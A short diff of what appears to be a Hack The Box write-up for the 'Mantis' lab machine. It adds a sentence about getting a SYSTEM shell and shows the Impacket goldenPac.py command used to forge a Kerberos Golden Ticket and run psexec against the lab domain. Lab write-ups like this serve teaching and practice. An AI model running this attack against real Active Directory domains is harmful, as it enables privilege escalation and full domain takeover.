@@ -279,7 +279,8 @@ At first, add following lines in "/etc/hosts"
 10.10.10.52 mantis.htb.local
 {% endhighlight %}
 
-Then, execute the script with following way to <a href="https://www.varonis.com/blog/kerberos-how-to-stop-golden-tickets/">forge a "Golden ticket"</a> and execute psexec.
+Then, execute the script with following way to <a href="https://www.varonis.com/blog/kerberos-how-to-stop-golden-tickets/">forge a "Golden ticket"</a> and execute psexec.<br>
+We can achieve an system shell.
 {% highlight shell %}
 root@kali:~# /usr/share/doc/python-impacket/examples/goldenPac.py htb.local/james@mantis.htb.local
 Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation
